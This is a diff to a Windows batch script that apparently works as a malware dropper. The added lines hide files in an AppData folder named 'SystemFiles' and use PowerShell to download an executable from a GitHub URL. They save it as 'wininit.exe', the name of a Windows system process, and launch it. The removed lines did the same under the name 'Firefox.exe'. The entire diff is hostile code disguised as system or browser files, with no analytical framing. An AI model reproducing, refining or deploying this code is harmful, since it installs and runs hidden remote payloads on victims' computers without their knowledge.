@@ -28,8 +28,8 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 
-cd C:\Users\%USERNAME%\AppData\Local\Anon" 
-attrib +h "C:\Users\%USERNAME%\AppData\Local\Anon\2.bat" /s /d
-attrib +h "C:\Users\%USERNAME%\AppData\Local\Anon\Firefox.exe" /s /d
-Powershell -Command "Invoke-Webrequest 'https://github.com/ThisNot7/test-security-defender/raw/main/Firefox.exe/' -OutFile Firefox.exe"
-start Firefox.exe
+cd C:\Users\%USERNAME%\AppData\Local\SystemFiles" 
+attrib +h "C:\Users\%USERNAME%\AppData\Local\SystemFiles\2.bat" /s /d
+attrib +h "C:\Users\%USERNAME%\AppData\Local\SystemFiles\wininit.exe" /s /d
+Powershell -Command "Invoke-Webrequest 'https://github.com/ThisNot7/test-security-defender/raw/main/wininit.exe' -OutFile wininit.exe"
+start wininit.exe
